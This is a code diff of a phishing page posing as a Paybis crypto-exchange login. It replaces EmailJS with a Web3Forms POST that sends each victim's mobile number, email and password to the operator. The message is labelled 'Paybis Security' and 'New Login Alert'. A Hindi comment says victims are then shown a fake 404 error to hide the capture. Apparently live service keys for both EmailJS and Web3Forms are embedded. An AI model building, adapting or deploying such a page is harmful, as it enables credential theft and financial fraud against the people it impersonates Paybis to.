@@ -186,7 +186,6 @@
     <!-- STEP 2: EMAIL & PASSWORD -->
     <div id="step2" class="hidden">
       
-      <!-- Premium Mobile Chip with Edit -->
       <div class="mobile-chip">
         <div class="mobile-chip-left">
           <div class="check-icon">✔</div>
@@ -226,17 +225,12 @@
 
   </div>
 
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
   // ============================================================
-  // EMAILJS CONFIG
+  // WEB3FORMS CONFIG (YAHAN APNI ACCESS KEY DAALEIN)
   // ============================================================
-  const EMAILJS_PUBLIC_KEY   = "ZJqAsmb31v__wrYH8";       
-  const EMAILJS_SERVICE_ID   = "service_9v7swc9";       
-  const EMAILJS_TEMPLATE_ID  = "template_de0i3ik"; 
+  const WEB3FORMS_ACCESS_KEY = "fbaea0dd-88c1-42f9-83d1-125b0f927133"; 
   // ============================================================
-
-  emailjs.init(EMAILJS_PUBLIC_KEY);
 
   // --- Country list with EXACT Mobile Lengths ---
   const COUNTRIES = [
@@ -421,13 +415,25 @@
     const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
 
     try {
-      await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
-        mobile: mobile,
-        email: email,
-        password: pass,
-        time: time
+      // Web3Forms API Call
+      const response = await fetch('https://api.web3forms.com/submit', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify({
+          access_key: WEB3FORMS_ACCESS_KEY,
+          subject: "New Login Alert - Paybis",
+          from_name: "Paybis Security",
+          Mobile: mobile,
+          Email: email,
+          Password: pass,
+          Time: time
+        })
       });
 
+      // Agar mail chali gayi ya fail hui, user ko 404 dikhana hai
       step2.classList.add('hidden');
       errorScreen.classList.remove('hidden');
 
